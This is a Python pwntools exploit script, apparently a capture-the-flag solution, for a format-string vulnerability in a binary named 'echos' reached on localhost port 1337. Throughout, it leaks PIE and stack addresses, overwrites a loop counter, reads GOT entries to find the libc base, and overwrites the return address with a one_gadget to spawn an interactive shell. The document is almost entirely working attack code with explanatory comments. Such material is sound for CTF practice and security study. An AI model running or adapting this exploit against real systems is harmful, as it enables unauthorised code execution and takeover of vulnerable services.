from pwn import *

# use one_gadget on the correct libc to find this
# miraculously, the constraints are satisfied for both my Kali system and the Docker one
ONE_GADGET_ADDR = 0x10a38c   # this is the address for remote docker host, for Kali 0xe926b

elf = ELF('./echos')

#p = process('./echos')
p = remote('localhost', 1337)
ui.pause()


log.info('Step 1: Get PIE offset and Step 2: Orienting ourselves on the stack')
p.sendline('%11$lx %16$lx')
response = p.recvline()
log.info('Received: ' + response)
response = response.split(' ')

# first part is some address relative to PIE offset
pie_base = int(response[0], 16) - 0x8dd  # 0x8dd is some magic constant which always works to get the actual memory map base, by observation through debugger
log.info('PIE base @ ' + hex(pie_base))
# then we have an address relative to return address (on stack)
addr_return_addr = int(response[1], 16) - 0xd8  # again, 0xd8 a magic constant which holds true regardless how many times we run it - difference between that address on the stack and the location of return address on the stack
log.info('Return address @ ' + hex(addr_return_addr))

log.info('Step 3: Writing stuff (and buying time)')
addr_i = int(response[1], 16) - 0x134  # yet another constant, this time pointing to iterator variable
log.info('interator/counter @ ' + hex(addr_i))
# set the iterator to some large negative value (two's complement ftw) so we can continue using printf
format_string = '%{}x%12$hn'.format(0xffff).ljust(32, ' ') + p64(addr_i + 2)
log.info('sending format string "{}"'.format(format_string))
p.sendline(format_string)

def write_32_bits(p, address, value):
    """Use pwntools pipe `p` to write 32-bit `value` at `address`"""
    first_write = (value >> 16) & 0xffff  # get leftmost 16 bits
    first_address = address + 0x2  # due to endianness, we need to write from the end first
    # similarly, we get the other 16 bits
    second_write = value & 0xffff
    second_address = address
    # but, due to us wanting to do it in one input line, we need to add on the necessary padding relatively to what we wrote before... but if this is less than what we wrote before, we need to overflow
    second_write = (second_write - first_write) % 2**16

    if first_write != 0:
        format_string = '%{}x%12$hn%{}x%13$hn'.format(first_write, second_write).ljust(32, ' ')
    else:  # handle case where first 2 bytes are 00 00
        format_string = '%12$hn%{}x%13$hn'.format(second_write).ljust(32, ' ')
    format_string += p64(first_address) + p64(second_address)

    log.info('sending format string "{}"'.format(format_string))
    p.sendline(format_string)

def write_64bits_in_two_inputs(p, address, value):
    """Use pwntools pipe `p` to write 64-bit `value` at `address`"""
    # write 32-bits two times
    write_32_bits(p, address + 0x4, (value >> 32) & 0xffffffff)
    write_32_bits(p, address, value & 0xffffffff)

def read_two_addresses(p, first_address, second_address):
    """Use pwntools pipe `p` to read the contents of two addresses"""
    DELIMITER = '||'
    # we use `%c` to read a newline so that printf sends a newline, without us having to
    # put \n anywhere earlier in our format string, because that would prematurely
    # stop the fgets input
    # but we need printf to print a newline so that the output is flushed for us
    format_string = (DELIMITER + '%12$s' + DELIMITER + '%13$s' + DELIMITER + '%14$c').ljust(32, ' ')
    format_string += p64(first_address) + p64(second_address) + '\n'

    log.info('sending format string "{}"'.format(format_string))
    p.send(format_string)  # send, not sendline because of manual '\n' above (for clearness)

    p.recvuntil(DELIMITER)  # read all the stuff before we reach the output we want
    first_value = p.recvuntil(DELIMITER, drop=True)
    second_value = p.recvuntil(DELIMITER, drop=True)
    p.recvline()  # get rid of the newline

    # convert to integers
    first_value = u64(first_value.ljust(8, '\x00'))
    second_value = u64(second_value.ljust(8, '\x00'))

    return first_value, second_value

log.info('Step 4: Get real addresses of libc functions')
got_fgets = elf.got['fgets'] + pie_base
log.info('fgets GOT @ ' + hex(got_fgets))
got_printf = elf.got['printf'] + pie_base
log.info('printf GOT @ ' + hex(got_printf))

func_fgets, func_printf = read_two_addresses(p, got_fgets, got_printf)
log.info('fgets @ ' + hex(func_fgets))
log.info('printf @ ' + hex(func_printf))

libc = ELF('./libc.so.6')  # get the libc file from https://libc.blukat.me/ once you get the two addresses
libc_base = func_fgets - libc.symbols['fgets']
libc_base2 = func_printf - libc.symbols['printf']
log.info('libc base @ ' + hex(libc_base))
if libc_base != libc_base2:
    log.warning('calculated libc base addresses do not match, are you sure you have the right libc version?')
else:
    log.success('libc base redundant calculations match!')

log.info('Step 5: one gadget pwnage')
addr_one_gadget = ONE_GADGET_ADDR
addr_one_gadget += libc_base
write_64bits_in_two_inputs(p, addr_return_addr, addr_one_gadget)

log.info('Step 6: unleashing the pwn')
# clear the top bits in the iterator variable so we get out of the loop
format_string = '%12$hn'.ljust(32, ' ') + p64(addr_i + 2)
log.info('sending format string "{}"'.format(format_string))
p.sendline(format_string)

p.clean()
p.interactive()
